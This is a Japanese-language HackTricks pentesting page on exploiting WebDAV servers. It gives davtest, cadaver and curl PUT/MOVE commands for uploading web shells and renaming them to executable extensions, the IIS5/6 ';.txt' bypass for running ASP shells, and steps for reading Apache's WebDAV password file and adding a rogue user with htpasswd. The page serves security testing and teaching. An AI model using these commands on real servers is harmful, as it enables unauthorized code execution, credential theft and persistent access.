# WebDav

{{#include ../../banners/hacktricks-training.md}}

**WebDav**が有効な**HTTPサーバー**を扱う際、正しい**認証情報**があれば**ファイルを操作**することが可能です。通常、これは**HTTP Basic Authentication**を通じて確認されます。このようなサーバーを制御するには、しばしば**ウェブシェルのアップロードと実行**が関与します。

WebDavサーバーへのアクセスには通常、**有効な認証情報**が必要であり、[**WebDavブルートフォース**](../../generic-hacking/brute-force.md#http-basic-auth)はそれを取得する一般的な方法です。

ファイルのアップロードに対する制限、特にサーバーサイドスクリプトの実行を防ぐ制限を克服するために、次のことができます：

- 制限がない場合、**実行可能な拡張子**を持つファイルを直接**アップロード**する。
- アップロードした非実行可能ファイル（.txtなど）の名前を実行可能な拡張子に**変更**する。
- アップロードした非実行可能ファイルを**コピー**し、その拡張子を実行可能なものに変更する。

## DavTest

**Davtest**は**異なる拡張子を持ついくつかのファイルをアップロードし**、その拡張子が**実行されるかどうかを確認**します：
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
![](<../../images/image (851).png>)

これは、**.txt**および**.html**拡張子が実行されていることを意味するわけではありません。これは、ウェブを通じて**これらのファイルにアクセスできる**ことを意味します。

## Cadaver

このツールを使用して、**WebDav**サーバーに**手動で**接続し、アクション（**アップロード**、**移動**、または**削除**など）を実行できます。
```
cadaver <IP>
```
## PUT リクエスト
```
curl -T 'shell.txt' 'http://$ip'
```
## MOVE リクエスト
```bash
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
## IIS5/6 WebDav 脆弱性

この脆弱性は非常に興味深いです。**WebDav**は**.asp**拡張子のファイルを**アップロード**または**名前変更**することを**許可しません**。しかし、名前の末尾に**";.txt"**を追加することで**バイパス**することができ、ファイルはあたかも .asp ファイルのように**実行**されます（**".txt"**の代わりに**".html"**を使用することもできますが、**";"**を忘れないでください）。

その後、あなたはシェルを**".txt"**ファイルとして**アップロード**し、**".asp;.txt"**ファイルに**コピー/移動**することができます。そのファイルにウェブサーバーを通じてアクセスすると、**実行**されます（cadaverは移動アクションが機能しなかったと言いますが、実際には機能しました）。

![](<../../images/image (1092).png>)

## 資格情報の後処理

WebdavがApacheサーバーを使用している場合、Apacheで構成されたサイトを確認する必要があります。一般的には：\
_**/etc/apache2/sites-enabled/000-default**_

その中には次のようなものが見つかるかもしれません：
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
ご覧のとおり、**webdav** サーバーの有効な **credentials** が含まれているファイルがあります:
```
/etc/apache2/users.password
```
このタイプのファイルの中には、**username** と **hash** のパスワードが含まれています。これらは、webdav サーバーがユーザーを認証するために使用している資格情報です。

これらを **crack** するか、何らかの理由で **webdav** サーバーに **access** したい場合は、**add more** を試みることができます。
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
新しい資格情報が機能しているか確認するには、次のことを行うことができます:
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
## 参考文献

- [https://vk9-sec.com/exploiting-webdav/](https://vk9-sec.com/exploiting-webdav/)

{{#include ../../banners/hacktricks-training.md}}
